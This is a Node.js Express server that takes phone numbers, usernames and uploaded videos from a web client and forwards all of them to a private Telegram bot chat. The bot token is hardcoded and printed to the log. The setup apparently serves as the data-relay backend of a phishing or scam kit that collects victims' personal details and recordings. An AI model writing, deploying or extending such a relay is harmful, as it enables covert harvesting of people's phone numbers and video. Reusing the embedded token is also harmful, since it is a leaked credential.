const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// =====================
// 📁 STORAGE
// =====================
const upload = multer({ dest: "uploads/" });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIREtQPUUTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// ❤️ WAKE ROUTE
// =====================
app.get("/", (req, res) => {
    res.send("Server is awake");
});

// =====================
// 📞 SEND PHONE + USERNAME
// =====================
app.post("/send-phone", async (req, res) => {
    try {
        const { phone, username } = req.body;

        console.log("📞 Received:", phone, username);

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: `📞 New User\n👤 Username: ${username}\n📱 Phone: ${phone}`
            }
        );

        res.send("Phone sent");

    } catch (err) {
        console.error("❌ Phone error:", err.response?.data || err.message);
        res.status(500).send("Failed");
    }
});

// =====================
// 🎥 VIDEO UPLOAD (MP4 LABEL)
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    try {
        console.log("🎥 Upload received");

        if (!req.file) {
            return res.status(400).send("No file uploaded");
        }

        const filePath = req.file.path;

        const form = new FormData();
        form.append("chat_id", CHAT_ID);

        form.append("video", fs.createReadStream(filePath), {
            filename: "video.mp4",
            contentType: "video/mp4"
        });

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            form,
            { headers: form.getHeaders() }
        );

        console.log("📨 Telegram response:", response.data);

        fs.unlinkSync(filePath);

        res.send("Video sent");

    } catch (err) {
        console.error("❌ Upload error:", err.response?.data || err.message);
        res.status(500).send("Upload failed");
    }
});

// =====================
// 🚀 START SERVER
// =====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
    console.log("TOKEN RAW:", BOT_TOKEN);
    console.log("TOKEN LENGTH:", BOT_TOKEN?.length);
    
});
